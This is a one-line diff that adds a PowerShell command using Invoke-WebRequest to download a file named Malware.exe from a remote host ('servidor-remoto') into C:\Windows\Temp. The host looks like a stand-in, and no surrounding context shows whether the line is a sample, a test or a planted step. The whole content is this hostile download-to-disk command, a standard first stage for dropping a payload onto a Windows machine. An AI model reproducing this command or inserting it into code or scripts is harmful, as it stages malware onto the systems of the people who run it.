@@ -1,0 +1,1 @@
+powershell -Command "Invoke-WebRequest -Uri 'https://servidor-remoto/Malware.exe' -OutFile 'C:\Windows\Temp\Malware.exe'"
